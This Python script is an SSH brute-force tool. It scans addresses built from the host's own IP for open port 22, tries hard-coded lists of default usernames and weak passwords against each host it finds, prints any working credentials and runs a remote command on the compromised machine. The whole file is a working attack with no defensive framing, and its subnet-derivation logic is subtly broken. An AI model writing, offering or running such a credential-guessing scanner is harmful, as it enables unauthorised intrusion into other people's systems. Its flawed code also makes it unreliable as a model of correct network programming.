import paramiko
import socket
import re

USERNAME_LIST = ["test", "root", "admin", "user"]
PASSWORD_LIST = ["123456", "egg", "password", "12345678", "qwerty", "11111111", "123456789", "12345", "1234",
                 "111111", "1234567", "123123", "abc123", "12345678", "88888888", "qwerty1234", "qwerty12345678"]

def main():
    net_ips = my_net()
    for ip in net_ips:
        print("network", ip)

    all_hosts = search_hosts(net_ips)
    for host in all_hosts:
        print("host", host)

    for ssh_host in all_hosts:
        for username in USERNAME_LIST:
            for password in PASSWORD_LIST:
                ssh_config = {
                    "hostname": ssh_host,
                    "port": 22,
                    "username": username,
                    "password": password
                }

                client = connect_ssh(ssh_config)
                if client is not None:
                    print(f"Login: {username}, Password: {password} OK")
                    do_it(client)
                    client.close()
                    break

def my_net():
    addrs = socket.gethostbyname_ex(socket.gethostname())[2]
    result = []
    for addr in addrs:
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', addr):
            result.append(addr)
    return result

def search_hosts(net_ips):
    all_hosts = []

    for host in net_ips:
        host = host.rstrip('0')

        for i in range(1, 255):
            ssh_host = host + str(i)
            try:
                with socket.create_connection((ssh_host, 22), timeout=1):
                    print(f"Try to connect to {ssh_host}")
                    all_hosts.append(ssh_host)
            except (socket.timeout, ConnectionRefusedError):
                continue

    return all_hosts

def connect_ssh(ssh_config):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(**ssh_config)
        return client
    except paramiko.AuthenticationException:
        return None

def do_it(client):
    try:
        stdin, stdout, stderr = client.exec_command("/usr/bin/whoami")
        output = stdout.read().decode("utf-8")
        print(output)
    except paramiko.SSHException as e:
        print(f"Failed to execute command: {e}")

if __name__ == "__main__":
    main()
